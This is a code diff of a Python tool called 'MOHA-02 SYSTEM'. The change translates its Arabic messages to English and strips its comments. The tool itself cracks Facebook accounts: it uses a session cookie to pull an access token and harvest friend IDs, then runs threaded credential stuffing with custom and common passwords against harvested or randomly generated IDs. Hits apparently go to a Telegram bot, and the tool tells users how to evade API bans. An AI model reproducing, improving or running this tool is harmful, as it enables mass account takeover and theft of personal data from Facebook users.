@@ -1,4 +1,4 @@
-# -*- coding: utf-8 -*-
+# -*- 
 # --------------------------------------------------------
 # Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
 # Developer: Moha Al-Shalfawi (@m_oha_02)
@@ -8,14 +8,13 @@
 import os, sys, time, requests, random, uuid, threading
 from concurrent.futures import ThreadPoolExecutor
 
-# --- مصفوفة الألوان المتناسقة ---
-G = '\033[1;32m' # أخضر (للعناوين والنجاح)
-R = '\033[1;31m' # أحمر (للحظر)
-Y = '\033[1;33m' # أصفر (للتنبيهات)
-B = '\033[1;34m' # أزرق (لمدخلات التوكن والآيدي)
-P = '\033[1;35m' # بنفسجي (لمدخلات الأرقام والسنوات)
-C = '\033[1;36m' # سماوي (للخيارات)
-W = '\033[1;37m' # أبيض
+G = '\033[1;32m' 
+R = '\033[1;31m' 
+Y = '\033[1;33m' 
+B = '\033[1;34m' 
+P = '\033[1;35m' 
+C = '\033[1;36m' 
+W = '\033[1;37m' 
 
 hits, cp, bad = 0, 0, 0
 stop_check = False
@@ -33,10 +32,10 @@ def logo():
 
 def join_channel():
     logo()
-    print(f"{Y}[!] يجب الاشتراك في القناة لتشغيل الأداة...")
+    print(f"{Y}[!] Subscribe to Channel to Start...")
     time.sleep(2)
     os.system("termux-open-url https://t.me/m_oha0_2b")
-    print(f"{G}[+] تم فتح القناة. يمكنك الآن استخدام الأداة.")
+    print(f"{G}[+] Channel Opened. Enjoy!")
     time.sleep(2)
 
 def login_fb(user, pw, chat_id, bot_token):
@@ -63,22 +62,20 @@ def login_fb(user, pw, chat_id, bot_token):
             print(f"\r{Y}[MOHA-CP] {user} | {pw}                      ")
         elif "Calls to this api have exceeded" in str(res) or "403" in str(res):
             stop_check = True
-            print(f"\n{R}[!] محظور من الفحص! شغل وضع الطيران ثم عد.")
+            print(f"\n{R}[!] API BANNED! Use Airplane Mode & Retry.")
         else:
             bad += 1
             sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {user[:10]}..."); sys.stdout.flush()
     except: pass
 
-# --- 1. أداة سحب الآيديات (المطورة) ---
 def tool_extract():
     logo()
-    cookie = input(f"{G}[+] Enter Cookie: {B}")
-    file_name = input(f"{G}[+] Enter File Name to Save: {B}")
-    limit = int(input(f"{G}[+] How Many IDs to Extract?: {P}"))
+    cookie = input(f"{G}[+] Cookie: {B}")
+    file_name = input(f"{G}[+] Save to: {B}")
+    limit = int(input(f"{G}[+] Limit IDs: {P}"))
     
-    print(f"{Y}[*] جاري السحب... انتظر")
+    print(f"{Y}[*] Extracting... Please Wait")
     try:
-        # كود استخراج الآيديات من الأصدقاء
         headers = {"cookie": cookie}
         token_res = requests.get("https://business.facebook.com/business_locations", headers=headers).text
         token = "EAAG" + token_res.split('EAAG')[1].split('"')[0]
@@ -90,47 +87,45 @@ def tool_extract():
                 if count >= limit: break
                 f.write(f"{person['id']}|{person['name']}\n")
                 count += 1
-        print(f"{G}[+] تم الحفظ في {file_name} بنجاح.")
-    except: print(f"{R}[!] فشل السحب. تأكد من الكوكيز.")
+        print(f"{G}[+] Saved to {file_name} Successfully.")
+    except: print(f"{R}[!] Extract Failed. Check Cookie.")
     time.sleep(2)
 
-# --- 2. أداة فحص الملف (يدوي) ---
 def tool_check_file():
     global stop_check
     stop_check = False
     logo()
-    file_path = input(f"{G}[+] Enter ID File Path: {B}")
-    bot_token = input(f"{G}[+] Enter Bot Token: {B}")
-    chat_id = input(f"{G}[+] Enter Chat ID: {B}")
+    file_path = input(f"{G}[+] File Path: {B}")
+    bot_token = input(f"{G}[+] Bot Token: {B}")
+    chat_id = input(f"{G}[+] Chat ID: {B}")
     
-    num_pass = int(input(f"{G}[+] How many passwords per ID?: {P}"))
-    custom_passes = [input(f"{C}  └─ Password {i+1}: {B}") for i in range(num_pass)]
+    num_pass = int(input(f"{G}[+] Pass Limit (per ID): {P}"))
+    custom_passes = [input(f"{C}  └─ Pass {i+1}: {B}") for i in range(num_pass)]
         
     try:
         users = open(file_path, "r").read().splitlines()
-        print(f"{Y}[*] بدأ الفحص... للوقف Ctrl+C")
+        print(f"{Y}[*] Checking Started... (Ctrl+C to stop)")
         with ThreadPoolExecutor(max_workers=35) as pool:
             for line in users:
                 if stop_check: break
                 uid = line.split('|')[0] if '|' in line else line
                 for pw in custom_passes:
                     pool.submit(login_fb, uid, pw, chat_id, bot_token)
-    except: print(f"{R}[!] الملف غير موجود!")
+    except: print(f"{R}[!] File Not Found!")
     time.sleep(2)
 
-# --- 3. أداة صيد قديم (مثالي) ---
 def tool_old_hunting():
     global stop_check
     stop_check = False
     logo()
     print(f"{C}[1] {W}2004-2005 {C}[2] {W}2009 {C}[3] {W}2010-2012 {C}[4] {W}2013-2014")
-    year = input(f"\n{G}[+] اختر السنة: {P}")
-    bot_token = input(f"{G}[+] Enter Bot Token: {B}")
-    chat_id = input(f"{G}[+] Enter Chat ID: {B}")
+    year = input(f"\n{G}[+] Select Year: {P}")
+    bot_token = input(f"{G}[+] Bot Token: {B}")
+    chat_id = input(f"{G}[+] Chat ID: {B}")
     
     passwords = ['123456', '1234567', '12345678', '123456789', '123123', '321321', 'password']
     
-    print(f"{Y}[*] بدأ صيد الحسابات القديمة...")
+    print(f"{Y}[*] Hunting Started...")
     with ThreadPoolExecutor(max_workers=35) as pool:
         while not stop_check:
             if year == '1': uid = str(random.randint(100000, 99000000))
@@ -140,15 +135,14 @@ def tool_old_hunting():
             else: break
             for pw in passwords: pool.submit(login_fb, uid, pw, chat_id, bot_token)
 
-# --- القائمة الرئيسية ---
 def main():
     join_channel()
     while True:
         logo()
-        print(f"{C}[1] {W}سحب آيديات (كوكيز -> ملف)")
-        print(f"{C}[2] {W}فحص ملف آيديات (كلمات سر يدوية)")
-        print(f"{C}[3] {W}صيد حسابات قديمة (سنوات محددة)")
-        print(f"{R}[0] {W}خروج")
+        print(f"{C}[1] {W}Extract IDs (Cookie -> File)")
+        print(f"{C}[2] {W}Check ID File (Custom Pass)")
+        print(f"{C}[3] {W}Old ID Hunting (Auto)")
+        print(f"{R}[0] {W}Exit")
         
         choice = input(f"\n{G}MOHA-02 > {P}")
         if choice == '1': tool_extract()
